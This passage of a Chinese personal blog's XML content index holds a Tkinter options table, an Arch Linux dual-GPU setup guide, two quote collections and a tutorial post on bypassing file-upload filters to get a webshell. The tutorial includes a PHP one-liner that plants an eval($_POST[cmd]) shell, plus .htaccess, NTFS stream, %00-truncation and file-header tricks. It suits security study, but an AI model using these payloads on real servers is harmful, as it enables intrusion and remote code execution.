<td align="center">**width ** 按钮的宽度，如未设置此项，其大小以适应按钮的内容（文本或图片的大小）</td>
</tr>
<tr>
<td align="center">18</td>
<td align="center">**wraplength ** 限制按钮每行显示的字符的数量</td>
</tr>
<tr>
<td align="center">19</td>
<td align="center">**text ** 按钮的文本内容</td>
</tr>
<tr>
<td align="center">19</td>
<td align="center"><strong>anchor</strong>  锚选项，控制文本的位置，默认为中心</td>
</tr>
</tbody></table>
</li>
</ul>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>python</tag>
        <tag>GUI</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Optimus在ArchLinux下配置双显卡双显示器</title>
    <url>/2021/04/05/%E4%BD%BF%E7%94%A8Optimus%E5%9C%A8ArchLinux%E4%B8%8B%E9%85%8D%E7%BD%AE%E5%8F%8C%E6%98%BE%E5%8D%A1%E5%8F%8C%E6%98%BE%E7%A4%BA%E5%99%A8/</url>
    <content><![CDATA[<p>ArchLinux使用过程中发现笔记本电脑双显卡和双显示器工作不正常，以下是个人的解决方案，参考ArchWiki，仅供参考。</p>
<a id="more"></a>

<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><strong>OS</strong>: Arch Linux x86_64</p>
<p><strong>Kernel</strong>: 5.11.11-arch1-1 </p>
<p><strong>DE</strong>: KDE Plasma 5.21.3</p>
<p><strong>GPU0</strong>: NVIDIA GeForce GTX 1050 Mobile</p>
<p><strong>GPU1</strong>: Intel UHD Graphics 630</p>
<p><strong>Monitor0</strong>为笔电自带屏幕，<strong>Monitor1</strong>为HDMI连接的外接显示器。</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>使用HDMI接入外接显示器，由于笔记本电脑自带的屏幕默认使用了Intel的核显，而HDMI接入的显示器会使用NVIDIA的显卡，造成禁用自带屏幕时的撕裂和渲染巨慢的问题。</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="保证显卡驱动正常"><a href="#保证显卡驱动正常" class="headerlink" title="保证显卡驱动正常"></a>保证显卡驱动正常</h3><h4 id="Intel显卡驱动"><a href="#Intel显卡驱动" class="headerlink" title="Intel显卡驱动"></a>Intel显卡驱动</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo pacman -S mesa lib32-mesa</span><br></pre></td></tr></table></figure>

<p>另外需要注意的是，如果之前安装了 <code>xf86-video-intel</code> 包，最好卸载掉。官方已经不建议继续使用此软件包。</p>
<blockquote>
<p> Often not recommended, see note below</p>
<p><strong>Note:</strong> Some (<a href="https://www.phoronix.com/scan.php?page=news_item&px=Ubuntu-Debian-Abandon-Intel-DDX" target="_blank" rel="noopener">Debian &amp; Ubuntu</a>, <a href="https://www.phoronix.com/scan.php?page=news_item&px=Fedora-Xorg-Intel-DDX-Switch" target="_blank" rel="noopener">Fedora</a>, <a href="https://community.kde.org/Plasma/5.9_Errata#Intel_GPUs" target="_blank" rel="noopener">KDE</a>) recommend not installing the <a href="https://www.archlinux.org/packages/?name=xf86-video-intel" target="_blank" rel="noopener">xf86-video-intel</a> driver, and instead falling back on the modesetting driver for Gen4 and newer GPUs (GMA 3000 from 2006 and newer). See [<a href="https://web.archive.org/web/20160714232204/https://www.reddit.com/r/archlinux/comments/4cojj9/it_is_probably_time_to_ditch_xf86videointel/" target="_blank" rel="noopener">1]</a>, [<a href="https://www.phoronix.com/scan.php?page=article&item=intel-modesetting-2017&num=1" target="_blank" rel="noopener">2]</a>, <a href="https://wiki.archlinux.org/index.php/Xorg#Installation" target="_blank" rel="noopener">Xorg#Installation</a>, and <a href="https://jlk.fjfi.cvut.cz/arch/manpages/man/modesetting.4" target="_blank" rel="noopener">modesetting(4)</a>. However, the modesetting driver can cause problems such as <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=370022" target="_blank" rel="noopener">Chromium Issue 370022</a>.</p>
</blockquote>
<p>卸载方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo pacman -Rsc xf86-video-intel</span><br></pre></td></tr></table></figure>

<h4 id="Nvidia显卡驱动"><a href="#Nvidia显卡驱动" class="headerlink" title="Nvidia显卡驱动"></a>Nvidia显卡驱动</h4><p>安装 nvidia 包，为了对 32 位程序的支持，安装 lib32-nvidia-utils 包 (位于 multilib 仓库，需要在pacman config中提前自行开启此仓库)。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo pacman -S nvidia lib32-nvidia-utils</span><br></pre></td></tr></table></figure>

<h3 id="配置-PRIME-render-offload"><a href="#配置-PRIME-render-offload" class="headerlink" title="配置 PRIME render offload"></a>配置 PRIME render offload</h3><p>安装 <code>nvidia-prime</code> 包来使用官方配置。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo pacman -S nvidia-prime</span><br></pre></td></tr></table></figure>

<p>重启系统后可以使用 <code>prime-run</code> 命令使指定程序在N卡上渲染。例如</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 以 n 卡渲染 vlc</span></span><br><span class="line">$ prime-run vlc</span><br><span class="line"><span class="comment"># 以 n 卡渲染 wine 游戏</span></span><br><span class="line">$ prime-run wine touhou08.exe</span><br></pre></td></tr></table></figure>

<p>可以使用 <code>mesa-demo</code> 包里的 <code>glxinfo</code> 指令查看当前使用的显卡。</p>
<h3 id="使用Optimus-Manager配置双显卡"><a href="#使用Optimus-Manager配置双显卡" class="headerlink" title="使用Optimus Manager配置双显卡"></a>使用Optimus Manager配置双显卡</h3><p>此时HDMI连接的显示器可以正常工作了。但是笔电自带的显示器卡在TTY，可能是由于显卡不兼容的问题。我选择了使用Optimus Manager进行双显卡的配置。</p>
<h4 id="事前准备"><a href="#事前准备" class="headerlink" title="事前准备"></a>事前准备</h4><p>首先清除（备份）<code>/etc/X11/xorg.conf.d/</code> 下的配置文件, 并删掉（备份）<code>/etc/X11/xorg.conf</code>, 因为Optimus Manager会自动生成配置文件存放到<code>/etc/X11/xorg.conf.d/</code>里面, 所以建议安装前把显示配置相关的文件都清除掉。</p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>安装Optimus Manager包：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Arch Linux CN</span></span><br><span class="line">$ sudo pacman -S optimus-manager</span><br><span class="line"><span class="comment"># AUR</span></span><br><span class="line">$ yay -S optimus-manager</span><br></pre></td></tr></table></figure>

<p>如果你是GDM用户或者Manjaro KDE 用户，请务必参考<a href="https://github.com/Askannz/optimus-manager#important--gnome-and-gdm-users" target="_blank" rel="noopener">README</a>中的注意事项。</p>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>接下来修改配置文件。将 <code>/usr/share/</code> 目录下的配置文件放到 <code>/etc/optimus-manager/</code> 下进行设置。将切换方式设为<code>switching=none</code>, 不推荐使用bbswitch（容易遇到ACPI锁死的问题, <a href="https://wiki.archlinux.org/index.php/NVIDIA_Optimus#Lockup_issue_(lspci_hangs)" target="_blank" rel="noopener">参考Wiki</a>）, 设置<code>pci_power_control=yes</code>让PCI Power Management切换显卡。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo cp /usr/share/optimus-manager.conf /etc/optimus-manager/optimus-manager.conf</span><br><span class="line">$ sudo vim /etc/optimus-manager/optimus-manager.conf</span><br></pre></td></tr></table></figure>

<p>根据开机需求自动选择显卡。</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">startup_mode=auto</span><br><span class="line">startup_auto_battery_mode=integrated</span><br><span class="line">startup_auto_extpower_mode=nvidia</span><br></pre></td></tr></table></figure>

<p>上述配置设置了开机时选择使用的显卡。电池模式使用了集显，而充电时使用独显。Reboot之后双显卡显示正常，此时可以使用 <code>nvidia-settings</code> 对双显示器的显示情况进行设置。解决了之前的“laggy”和“tearing”的情况。</p>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ optimus-manager --switch nvidia <span class="comment">#切换到nvidia显卡</span></span><br><span class="line">$ optimus-manager --switch integrated <span class="comment">#切换到集显</span></span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>切换显卡的过程中会自动注销登录, 所以记得<strong>保存并关掉电脑正在运行的程序</strong>。</li>
<li>你可以在配置文件中修改<code>auto_logout=false</code>禁止自动注销以手动注销切换显卡。</li>
</ul>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>grub在哪块屏幕上显示的问题，之后补充。</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol>
<li><a href="https://blog.sakuya.love/archives/linuxgpu/" target="_blank" rel="noopener">https://blog.sakuya.love/archives/linuxgpu/</a></li>
<li><a href="https://blog.starry-s.me/posts/archlinux-pavilion-gaming-laptop/" target="_blank" rel="noopener">https://blog.starry-s.me/posts/archlinux-pavilion-gaming-laptop/</a></li>
<li><a href="https://wiki.archlinux.org/index.php/NVIDIA" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/NVIDIA</a></li>
</ol>
]]></content>
      <categories>
        <category>系统</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>显卡</tag>
      </tags>
  </entry>
  <entry>
    <title>妙语集II</title>
    <url>/2020/10/24/%E5%A6%99%E8%AF%AD%E9%9B%86II/</url>
    <content><![CDATA[<p>周围人们有趣言论的碎片集合。第二辑。</p>
<a id="more"></a>

<ul>
<li>你问我我也要百度的啊。</li>
</ul>
<div style="text-align: right"><i>by zkonge@QQ</i></div><hr/>

<ul>
<li>还是要声明实验班包括西电好不好和你强弱没什么关系。</li>
</ul>
<div style="text-align: right"><i>by sad@QQ</i></div><hr/>

<ul>
<li>所谓的儿童向的内容是指，大人们将自己觉得非常酷的内容，用容易理解的方式传达给孩子们的创作内容。而所谓的骗小孩子的内容是指，大人们自己都不太喜欢，但是估计孩子们会喜欢，以此标准进行推测而做出来的内容。</li>
</ul>
<div style="text-align: right"><i>by kiwaPW@twitter</i></div><hr/>

<ul>
<li>你不学咋知道你不会写嘛。</li>
</ul>
<div style="text-align: right"><i>by zkonge@QQ</i></div><hr/>

<ul>
<li>少pi话，过度的谦虚不是美德。</li>
</ul>
<div style="text-align: right"><i>by 槐@QQ</i></div><hr/>

<ul>
<li>如何减少生活中的难过并使自己异常平稳:<br>1.不主动视奸<br>2.控制不了就删除/拉黑<br>3.少说话,多听多动脑思考<br>4.凡事有必要只解释一次，信就信不信就滚<br>5.多看书静不下心就看电影，不看网络文学不信鸡汤<br>6.不要过多在意他人的目光<br>7.不要多想，学会原谅自己开心最重要<br>8.做不到按时睡觉,至少要做到饭点吃饭<br>9.社交软件控制在1-3个内，不要因为无聊而社交<br>10.让自己难过的事，发泄一次就到此为止</li>
</ul>
<div style="text-align: right"><i>by Uch1haOb1to@weibo</i></div><hr/>

<ul>
<li>调v几年了…初二吧..挺久了,也没啥能引以为豪的。<br>其实我表面挺快乐,但我一再怀疑自己是否真的做了正确选择。看到后面的人一个个超过我,那种挫败感我在熟悉不过。不过回念一想本来我就是兴趣使然才选择了 Vocaloid,因为它有趣,它小众,当然也能找到朋友。<br>直到今天我自己才可能想通了,旁人的成功也好,与我有何关系。我所最应该做的是享受调v的过程罢了。我迷茫的最大原因只是嫉妒的作祟。我要做的事情还很多,并不应该让 Vocaloid成为我的心结,忙起来自然也就不会想那么多了吧。<br>我觉得我还是会遵守我曾经的想法:<br>兴趣使然,圈内透明。</li>
</ul>
<div style="text-align: right"><i>by Pr0crastHErtz@QQ</i></div><hr/>

<ul>
<li>网络暴力每天都在发生，但只要你不是被暴力的当事人，好像就没有人关心被暴力者的真实生活究竟遭遇了什么。<br>有人说互联网是另一个世界，它脱离现实是那么的虚幻与自由，自由到我们可以不加任何隐藏的表达自己的观点。每个发表言论的人都觉得自己的一句话无足轻重，但无数自以为是的正义感聚在一起，可能就会轻易夺走人的生命。<br>即使真的造成了不好的后果，但也没有人认为自己有什么错，最多唏嘘几声，变成茶余饭后的谈资，然后就像一个循环，继续转移到新的事件里。<br>网络世界是公平的，每个人都有可能成为施暴者，也有可能成为受害者。你永远不知道下一个被围攻的人是不是你。<br>“己所不欲，勿施于人。”</li>
</ul>
<div style="text-align: right"><i>by 我永远喜欢海棠零@哔咔漫画</i></div><hr/>

<ul>
<li>总感觉某些平台有着类似的气质,有的是开源社区,有的是文青聚集地,有的是硬核玩家群体。回头想想他们都有一个共同点,就是愿意开眼看世界。</li>
</ul>
<div style="text-align: right"><i>by 坂本@twitter</i></div><hr/>

<ul>
<li>每天進步的方式<br>就是早上醒來時告訴自己「我就爛」<br>就能謙虛地面對自身的渺小及學問的浩瀚<br>Yes we suck.</li>
</ul>
<div style="text-align: right"><i>by 泰迪TED-E@bilibili</i></div><hr/>

<ul>
<li>一些灵感虽然记录在了纸上，但也是有保质期的，所以得加紧去完成。发现无论如何也无法完成的，缩减体裁也好，合作也好，只要保留住主题思想，仍然是灵感完美的体现。<br>但是一旦看不懂灵感了，无法理解当时为什么这样写了，不明白为什么会记下这么幼稚的东西，甚至有悖于自己现存的价值观了，这样一条灵感便终末了。除了有写在纸上的意义，不再被任何人发现，随时间消亡。<br>这样的感觉是很痛苦的，感到的幼稚与回顾过去的作品感到的幼稚截然不同，更多的是一种无力挽回的悲伤。</li>
</ul>
<div style="text-align: right"><i>by 荷林@QQ</i></div><hr/>

<ul>
<li><p>不劝你们看爽文，既然发在匿名版我也不打广告。好好看点严肃东西武装一下自己吧肥哥们，爽文接触多了人会傻掉的，虽然这么说对不起衣食父母，但是写爽文给人看总觉得像在杀猪。我没某些网文作家那么不要脸，不会信誓旦旦地说自己写的东西也算文学。唉总之很矛盾，知道自己写的狗屁不通，让老师知道了会骂死我的，但是挣得确实不少。</p>
<div style="text-align: right"><i>by DXvbvaM@adnmb</i></div><hr/></li>
<li><p>更何况创作者啊，你在创作，就已经比百分之九十九的人厉害了，你有自己的世界啊，你这般贬低自己和自己的作品，实际上是一种可恶的傲慢啊。正如殷实的人整天抱怨自己贫穷和不幸，不满足是好事，但不要把已有的说成一文不值。<br>不要深陷在追逐痛苦的道路上！<br>自勉。</p>
<div style="text-align: right"><i>by 卤疫十四@QQ</i></div><hr/></li>
<li><p>请重视算法导论和数据结构这种超级无聊又不直接增加生产力的书、同时更要重视线性代数和概率论这种看起来“与现实脱节”的科目，这些无聊直接决定了你读文章的上限…这是我最近在使用 Jupyter Notebook时体会到的（<br>by unknown@zhihu</p>
<div style="text-align: right"><i>by unknown@zhihu</i></div><hr/></li>
<li><p>Re: 脚本小子？<br>我也是这么想的，但是一想我也是，我就闭嘴了。</p>
<div style="text-align: right"><i>by luoqian@QQ</i></div></li>
</ul>
]]></content>
      <categories>
        <category>悠哉日常</category>
      </categories>
      <tags>
        <tag>妙语集</tag>
      </tags>
  </entry>
  <entry>
    <title>妙语集I</title>
    <url>/2020/10/24/%E5%A6%99%E8%AF%AD%E9%9B%86I/</url>
    <content><![CDATA[<p>周围人们有趣言论的碎片集合。第一辑。</p>
<a id="more"></a>

<ul>
<li>如果考虑寿命的话…<br>实际上把过度折腾的时间节省下来，用来学习工作。所能得到的收益如果用货币来衡量。我觉得甚至有足够你再买不止一个硬盘了…</li>
</ul>
<div style="text-align: right"><i>by JimMoen@Archlinuxcn</i></div>

<hr/>

<ul>
<li><p>有合理反馈能力的白老鼠才有用，吃了毒药就死了或者跑掉的白老鼠无用。</p>
<div style="text-align: right"><i>by oldherl@Archlinuxcn</i></div></li>
</ul>
<hr/>

<ul>
<li><p>现在这样说有点陈词滥调，但因为我们不为使用这些产品付钱，广告商为我们使用的产品付钱，广告商是顾客，我们是被销售的商品。经典的说法是，“如果你没有花钱买产品，那你就是被卖的产品”。</p>
<div style="text-align: right"><i>by unknown@acfun</i></div></li>
</ul>
<hr/>

<ul>
<li><p>没事不要免费帮助别人。你如果免费帮助别人，那么最终会有两个结果：<br>①当你停止免费援助的时候，那个人会恨你。<br>②你免费帮他，他在潜意识里会认为，你就是个没有本事的废物，不值钱，很贱。这不怪他，这是人的本性。<br>所以说，你如果认为自己的付出有价值，就要索取相应的报酬。</p>
<div style="text-align: right"><i>by Gnaiqux@QQ</i></div></li>
</ul>
<hr/>

<ul>
<li><p>加了QQ群，被里面的小圈子和老人的某些行为恶心到了，但是又想靠这个群打发时间，请问我应该把那些大群小群全部退掉再把里面加的人拉黑么？<br>Re: 不，你只会陷入空虚。选择性无视就好了，消遣时间而已别认真。恶心的不用管就是，喜欢就聊，不喜欢就别管。</p>
<div style="text-align: right"><i>by 2VwVEq4 & iB0zsYZ@adnmb</i></div></li>
</ul>
<hr/>

<ul>
<li><p>本群是为兴趣而建的群。<br>谁的哪方面能力如何并没有人关心。<br>无论是一昧地贬低自己还是一昧地抬高别人，都说不上谦逊和赞美他人这些美好品质任何其一。相反的，自己能力上不会有丝毫的提升，也不会博得谁的一丝同情。<br>大家聚在这里是因为大家对相同的事物有相同的兴趣和爱。不分高低强烈的爱。<br>希望大家谨记。</p>
<div style="text-align: right"><i>by 羅威@QQ</i></div></li>
</ul>
<hr/>

<ul>
<li><p>演讲自己都记不住，要看稿子，怎么让听众记得住呢？</p>
<div style="text-align: right"><i>by 李敖@北京大学</i></div></li>
</ul>
<hr/>

<ul>
<li>现在很多玩家的评论总是喜欢用一些术语表示专业，而这一部分人的认知也仅限于听过这些东西而已，就用大篇幅文字解释自己的挑剔。我想知道否定一个作品的价值真的只需要一句话这么简单吗？</li>
</ul>
<div style="text-align: right"><i>by oooooohmygosh@bilibili</i></div>

<hr/>

<ul>
<li>你把安卓吹出花来谷歌也不会给你一分钱，你把iOS捧到天上这系统也是别人做的，两个都跟你没半毛钱关系，就是个消费者而已，觉得哪个好用用哪个就是了，你可以安卓苹果选其一，也可以双修两个都用，想与众不同点你还可以用塞班。天天划阵营满世界的吆喝撕逼，不知道的人还以为谷歌苹果是你二舅家开的呢，这么费力献殷勤，你撕逼撕赢了，人给你钱了还是给你股份了？都是闲的蛋疼。</li>
</ul>
<div style="text-align: right"><i>by lansander@bilibili</i></div>

<hr/>

<ul>
<li>之所以缝合乖口嗨能流行不还是被逼出来的，玩个游戏你不过审，看个电影你不过审，上个网还有墙，看个日漫还能下架喽。就只剩这些装疯卖傻的能逗一乐，再给禁了，我一小老百姓在网上还能干啥？那天看b站抖音的后浪带我领略中国之美？现实生活够难顶了，去虚拟世界裸奔，你还要拿着探照灯照相机来抓我？</li>
</ul>
<div style="text-align: right"><i>by 筱筱小师妹@bilibili</i></div><hr/>

<ul>
<li>能填补人类内心空洞的归根结底是与他人的情感链接，其他一切行为都是对这一需求的象征性满足。</li>
</ul>
<div style="text-align: right"><i>by 姬云兵@壹心理</i></div><hr/>

<ul>
<li>都是一拨人，混混这儿混混那儿，说话的方式在变，水平始终就那么点。<br>所有网站一开始那波人都是有点想法的，最后都会同质化。<br>然后这个网站就毁了。</li>
</ul>
<div style="text-align: right"><i>by X54uoxc3@adnmb</i></div><hr/>

<ul>
<li>和别人攀比说到底是心内不够自信，一个内心很自信的人，会更加包容自己与别人的不同。因为人无完人，自己有比不上别人的地方，别人也会有不如你的。内心对自己很有信心，坚信自己不一样的美或者帅气，就能用一颗平常心去欣赏别人的闪光点了。乱花钱不能带给人自信和安全感，只会让人越来越缺少安全感。</li>
</ul>
<div style="text-align: right"><i>by 米小兜@zhihu</i></div><hr/>

<ul>
<li>你拿这种事情来网上找共情，这不是闲的嘛<br>自己被戳弄就恼羞成怒，旁人被戳弄就笑嘻嘻<br>这不是常态么</li>
</ul>
<div style="text-align: right"><i>by T9mCsl5@adnmb</i></div><hr/>

<ul>
<li>我觉得可能是我的一种习惯，我有的时候觉察到自己的情绪开始失控，就会条件反射地尝试让自己站在上帝视角看问题，这算是一种应激调节的方式吧，已经形成一种固定的方法了，这方面之前有人问了我一些问题我才意识到。主要是没什么意义，从最功利的角度上来说，单纯的抒情不能帮助我们理解任何东西。我现在把情感放一边了，争这些东西也争不出来什么（<br>等我睡一觉恢复成一个完整的人再说。</li>
</ul>
<div style="text-align: right"><i>by megakite@QQ</i></div><hr/>]]></content>
      <categories>
        <category>悠哉日常</category>
      </categories>
      <tags>
        <tag>妙语集</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传操作整理</title>
    <url>/2020/07/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%93%8D%E4%BD%9C%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<p>获取Webshell的常见操作，整理一下。</p>
<a id="more"></a>

<h2 id="上传及绕过"><a href="#上传及绕过" class="headerlink" title="上传及绕过"></a>上传及绕过</h2><h3 id="常见上传点"><a href="#常见上传点" class="headerlink" title="常见上传点"></a>常见上传点</h3><ul>
<li>上传头像</li>
<li>上传相册</li>
<li>上传附件</li>
<li>添加文章图片</li>
<li>前台留言资料上传</li>
<li>编辑器文件上传</li>
</ul>
<h3 id="后缀绕过"><a href="#后缀绕过" class="headerlink" title="后缀绕过"></a>后缀绕过</h3><ul>
<li>PHP:php2、php3、php5、phtml、pht(是否解析需要根据配置文件中设置类型来决定)</li>
<li>ASP：asa、cer、cdx</li>
<li>ASPX：ascx、ashx、asac</li>
<li>JSP：jsp、jspx、jspf</li>
</ul>
<h3 id="绕过类型"><a href="#绕过类型" class="headerlink" title="绕过类型"></a>绕过类型</h3><ul>
<li>Content-Type绕过</li>
<li>前端绕过</li>
<li>文件解析规则绕过</li>
<li>Windows环境特性绕过</li>
<li>文件名大小写绕过</li>
<li>双写绕过</li>
<li>点空格绕过</li>
<li>文件头绕过</li>
<li>条件竞争绕过</li>
</ul>
<h2 id="漏洞在系统中的差异"><a href="#漏洞在系统中的差异" class="headerlink" title="漏洞在系统中的差异"></a>漏洞在系统中的差异</h2><h3 id="IIS-5-x-6-0-解析漏洞"><a href="#IIS-5-x-6-0-解析漏洞" class="headerlink" title="IIS 5.x/6.0 解析漏洞"></a>IIS 5.x/6.0 解析漏洞</h3><p>1、当创建.asp的文件目录的时候，在此目录下的任意文件，服务器都解析为asp文件。例如：<br>漏洞目录利用形式：<a href="http://www.xxx.com/xx.asp/xx.jpg%E3%80%82" target="_blank" rel="noopener">www.xxx.com/xx.asp/xx.jpg。</a><br>xx.jpg的内容可以为一段合法的asp脚本文件。<br>2、服务器默认不解析”;“以后的内容，导致xx.asp;.jpg被解析成xx.asp<br>漏洞文件利用形式：<a href="http://www.xxx.com/xx.asp;.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp;.jpg</a><br>xx.jpg的内容可以为一段合法的asp脚本文件。</p>
<h3 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h3><p>在低版本Nginx中存在一个由PHP-CGI导致的文件解析漏洞。在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo在本机中位于php.ini配置文件中，默认是开启的，当URL中有不存在的文件时，PHP就会默认向前解析。</p>
<p>普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。访问<code>http://www.xx.com/phpinfo.jpg/1.php</code> 这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP-CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢？这就要说到fix_pathinfo这个选项了。如果开启了这个选项，那么就会触发在PHP中的如下逻辑：PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了。</p>
<p>在默认Fast-CGI开启状况下上传名字为xx.jpg,内容为:<br><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></p>
<p>然后访问xx.jpg/.php,在这个目录下就会生成一句话木马shell.php。</p>
<h3 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h3><p>Apache 在1.x和2.x版本中存在解析漏洞，例如如下地址格式：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">www<span class="selector-class">.xxxx</span>.com/apache<span class="selector-class">.php</span><span class="selector-class">.bbb</span>.aaa</span><br></pre></td></tr></table></figure>

<p>Apache从右至左开始判断后缀，若aaa非可识别后缀，再判断bbb，直到找到可识别后缀为止，然后将该可识别后缀进解析，因此如上地址解析为访问apache.php文件。</p>
<p>另外对于Apache解析漏洞的正确说法应该是，使用module模式与php结合的所有版本apache存在未知扩展名解析漏洞，使用fastcgi模式与php结合的所有版本apache不存在此漏洞。而是否解析的后缀名在文件mime.types（互联网媒体类型（Internet media type，也称为MIME类型（<em>MIME type</em>）或内容类型（<em>content type</em>））中查找是否出现。</p>
<h2 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h2><h3 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h3><p>只在前端利用JS来做效验，采用禁用JS上传、抓包上传都可以绕过此处限制。</p>
<h3 id="htaccess规则文件绕过"><a href="#htaccess规则文件绕过" class="headerlink" title=".htaccess规则文件绕过"></a>.htaccess规则文件绕过</h3><p>在一些启用了.htaccess文件的网站上就可以使用此文件类型来绕过限制较全面的黑名单过滤。</p>
<p>先上传一个.htaccess文件，内容为：<code>AddType application/x-httpd-php .aaa</code>。然后再上传文件后缀为.aaa的文件，让其解析为php类型文件。上传成功后即可访问并getshell。</p>
<h3 id="文件名后缀大小写混合绕过"><a href="#文件名后缀大小写混合绕过" class="headerlink" title="文件名后缀大小写混合绕过"></a>文件名后缀大小写混合绕过</h3><p>在对后缀的判断中，如果只是对字符串进行单独的比较来判断是不是限制文件，可以采用后缀名大小写绕过形式。如<code>a.PHp</code>。</p>
<h3 id="Windows文件流特性绕过"><a href="#Windows文件流特性绕过" class="headerlink" title="Windows文件流特性绕过"></a>Windows文件流特性绕过</h3><p>流文件，即NTFS交换数据流（alternate data  streams，简称ADS），是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，它使用资源派生来维持与文件相关的信息。创建一个数据交换流文件的方法很简单，命令为“宿主文件:准备与宿主文件关联的数据流文件”。</p>
<p>上传文件：<code>xxx.php::$data</code>。访问时可以直接访问xxx.php文件。</p>
<h3 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="%00截断绕过"></a>%00截断绕过</h3><p>以上问题被绕过的根本原因是采用了一些有缺陷的黑名单限制，一般采用白名单的限制会减少相当多的绕过问题产生，但是并不意味着一定安全，在某些没有处理严格的程序上，仍然可以采用截断绕过的形式。</p>
<p>例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出代码采用的白名单校验，只允许上传图片格式，理论上这个上传是不好绕过的。但是后面采用保存文件的时候，是路径拼接的形式，而路径又是从前端获取，所以我们可以采用在路径上截断。如下上传，显示文件路径中有个空格，这并不是真正意义上的空格，而是%00截断后显示成的空格。</p>
<p><img src="https://misakikata.github.io/2019/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1559095054720.png" alt="1559095054720"></p>
<h3 id="文件头检测绕过"><a href="#文件头检测绕过" class="headerlink" title="文件头检测绕过"></a>文件头检测绕过</h3><p>JPG：文件头前十个字节为<code>FF D8 FF E0 00 10 4A 46 49 46</code>，FF D8代表SOI标记，意思是图像文件开始值。<code>4A 46 49 46</code>代表字符串JFIF标记。</p>
<p>PNG：开头4字节为右栏中<code>‰PNG</code>字样，PNG的8字节文件署名域用来识别该文件是不是PNG文件。也就是<code>89 50 4E 47 0D 0A 1A 0A</code>。</p>
<p>GIF：GIF89a</p>
